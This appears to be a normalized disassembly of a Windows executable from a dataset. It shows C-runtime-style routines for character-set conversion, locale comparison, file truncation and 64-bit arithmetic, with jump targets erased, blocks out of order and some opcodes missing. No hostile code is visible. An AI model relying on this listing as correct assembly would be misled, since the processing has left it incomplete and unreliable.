cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41e1f6
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
push edi
mov edi [ rw-data ]
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
cmp eax esi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
call sub_413f18
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push [ ebp - 0x8 ]
push eax
push 0xffffffff
push [ edi ]
push esi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_410135
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_41f26f
pop ecx
pop ecx
test eax eax
jge r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push eax
push esi
push esi
call ebx
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
push [ ebp - 0x4 ]
call sub_410135
pop ecx
mov [ ebp - 0x4 ] esi
sub_41e28d
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_40e9ad
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40e1e0
leave
retn
sub_41e2d6
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40e1e0
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_414890
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x2c ] 0x1
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
call sub_41a397
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_410212
pop ecx
cmp eax edi
je r-xdata
call sub_41e490
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_410680
mov esi eax
pop ecx
inc esi
mov ebx [ WideCharToMultiByte@IAT ]
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_413f18
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_410135
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_41e4bc
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_419d3c
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_410cee
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_419d3c
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_419d3c
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_419d3c
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_41e672
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_410cee
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_417676
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_410cee
mov [ eax ] 0xd
call sub_410d01
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_410d01
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_410cee
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_415c25
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_41e672
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
ja r-xdata
sub_41e672
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov eax [ edx ]
and esi 0x1f
shl esi 0x6
lea ecx [ eax + esi ]
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_41e72e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_410cee
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_41e786
mov eax [ rw-data ]
push esi
mov esi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_41e7c0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_41e7ed
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_40e5f8
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_416a96
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_41c3ac
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e1e0
leave
retn
sub_41e895
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_40e5f8
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_416a96
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_41c8f0
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e1e0
leave
retn
sub_41e93d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi [ ecx + 0xc ]
cmp esi ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
jbe r-xdata
call sub_410cee
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
cmp edx ebx
mov [ esi ] bl
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
mov eax edx
jmp r-xdata
cmp edx ebx
mov [ esi ] 0x30
lea eax [ esi + 0x1 ]
jle r-xdata
call sub_410cee
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
cmp edx ebx
mov [ eax ] bl
jl r-xdata
mov cl [ edi ]
cmp cl bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40edf4
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc edi
jmp r-xdata
lea edi [ esi + 0x1 ]
push edi
call sub_410680
inc eax
push eax
push edi
push esi
call sub_40fdd0
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
cmp edx ebx
jg r-xdata
xor eax eax
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_41e9fc
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
movzx eax [ edx + 0x6 ]
push ebx
mov ecx eax
push esi
push edi
shr ecx 0x4
and eax 0x8000
mov edi 0x7ff
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test ebx ebx
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
add ecx 0x3c01
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ecx 0x3c00
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebx ecx
add edx edx
shr ebx 0x1f
or edx ebx
add ecx ecx
add edi 0xffff
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
or ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl edx 0xb
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
test esi ecx
jne r-xdata
movzx edi cx
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_41eab9
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x30 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_41e9fc
pop ecx
pop ecx
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x10 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_41f4ba
mov esi [ ebp - 0x30 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x2a ]
mov [ ebx ] eax
movsx eax [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_413c11
add esp 0x24
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_40e1e0
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40eccc
add esp 0x14
sub_41eb50
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_41ec30
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_41ec4f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
test ecx 0xfcf0fce0
je r-xdata
mov esi [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
je r-xdata
call sub_41ff0c
call sub_41ff0c
mov [ esi ] eax
jmp r-xdata
call sub_410cee
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_40edf4
add esp 0x14
mov eax edi
pop edi
jmp r-xdata
push esi
push esi
call sub_41ff0c
pop ecx
pop ecx
mov [ edi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_41ecbb
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
cmp [ ebp + 0x14 ] 0xffffffff
jge r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
xor eax eax
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_41ecf9
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
jne r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
dec ecx
mov eax [ ebp + 0x8 ]
sub eax ecx
dec eax
pop ebp
retn
inc eax
sub_41ed17
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
push esi
push edi
xor edi edi
mov ebx edx
mov esi ecx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
push 0x1
mov eax r--data
push eax
push 0x1
push eax
push edi
push edi
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jge r-xdata
push [ ebp + 0x10 ]
mov eax ebx
call sub_41ecf9
pop ecx
mov [ ebp + 0x10 ] eax
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov edx [ ebp + 0x18 ]
cmp edx edi
jle r-xdata
xor eax eax
jmp r-xdata
cmp edx 0xffffffff
jl r-xdata
mov eax [ ebp - 0x1c ]
push edx
call sub_41ecf9
mov edx eax
pop ecx
mov [ ebp + 0x18 ] edx
jmp r-xdata
mov [ rw-data ] 0x2
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40e1e0
leave
retn
mov ecx [ rw-data ]
cmp ecx 0x2
je r-xdata
xor edi edi
xor ebx ebx
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp ecx edi
je r-xdata
cmp [ ebp + 0x1c ] edi
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
xor eax eax
inc eax
cmp ecx eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_41e28d
mov esi eax
pop ecx
cmp esi 0xffffffff
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov [ ebp - 0x28 ] edi
cmp [ ebp + 0x1c ] edi
jne r-xdata
cmp esi [ ebp + 0x1c ]
je r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov [ ebp + 0x1c ] ecx
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
mov esi eax
test ebx ebx
je r-xdata
push 0x0
push 0x0
lea eax [ ebp + 0x10 ]
push eax
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x1c ]
call sub_41e2d6
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
cmp edx edi
jne r-xdata
mov eax esi
push ebx
call sub_410135
push edi
call sub_410135
pop ecx
pop ecx
push 0x0
push 0x0
lea eax [ ebp + 0x18 ]
push eax
push [ ebp - 0x1c ]
push esi
push [ ebp + 0x1c ]
call sub_41e2d6
mov edi eax
add esp 0x18
test edi edi
jne r-xdata
cmp edx eax
jg r-xdata
push 0x2
mov esi [ MultiByteToWideChar@IAT ]
push edi
push edi
push [ ebp + 0x10 ]
push ebx
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
cmp ebx edi
je r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] edi
push ebx
call sub_410135
pop ecx
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jle r-xdata
mov edi 0x400
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x1c ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
and [ ebp - 0x20 ] 0x0
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
pop eax
jmp r-xdata
push ebx
push [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
cmp [ ebp + 0x18 ] edi
jle r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
push [ ebp - 0x20 ]
call sub_41a397
mov eax [ ebp - 0x28 ]
pop ecx
jmp r-xdata
push 0x0
push 0x0
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push eax
call sub_410212
pop ecx
test eax eax
je r-xdata
call sub_41e490
mov eax esp
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x2
jae r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
jle r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add eax 0x8
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
mov cl [ ebx ]
cmp cl [ eax ]
jb r-xdata
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
mov ecx [ ebp - 0x1c ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
push edi
call sub_41a397
pop ecx
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x20 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
mov [ ebp - 0x28 ] eax
push eax
call sub_410212
pop ecx
test eax eax
je r-xdata
call sub_41e490
mov edi esp
test edi edi
je r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
sub_41f087
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
push [ ebp + 0x24 ]
mov edx [ ebp + 0x14 ]
push [ ebp + 0x20 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41ed17
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41f0c9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
mov edx [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
